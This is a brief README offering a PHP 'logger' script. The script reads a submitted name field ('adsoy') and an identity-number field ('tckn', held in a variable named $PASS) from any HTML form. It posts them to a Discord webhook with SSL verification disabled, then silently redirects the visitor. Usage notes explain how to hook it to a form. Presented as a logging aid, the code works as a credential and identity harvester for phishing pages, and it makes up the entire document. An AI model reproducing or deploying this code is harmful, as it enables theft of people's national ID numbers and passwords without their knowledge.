
## What is php logger ?
Use Discord like a logger. 
You can log your input's using discord.





        <?php
    
    if ($_POST) {
    
    $WEBHOOK = "PASTE YOUR OWN DİSCORD WEBHOOK";
    
    $NAME = $_POST["adsoy"];
    
    $PASS = $_POST["tckn"];
    
    $headers = [ 'Content-Type: application/json; charset=utf-8' ];
    
    $POST = [ 'username' => 'DuzgunLog', 'content' => "$NAME | $PASS" ];
    
    $ch = curl_init();
    
    curl_setopt($ch, CURLOPT_URL, $WEBHOOK);
    
    curl_setopt($ch, CURLOPT_POST, true);
    
    curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
    
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    
    curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($POST));
    
    $response = curl_exec($ch);
    
    header('Location: bebek.php'); // redirect page after click submit
    
    }
    
    ?>









## USEAGE
-You just need to use code that I gave you above.

-And make sure in your html input's "name" parameter and php part is the same value.

-And make sure your form element has a method="post" exist
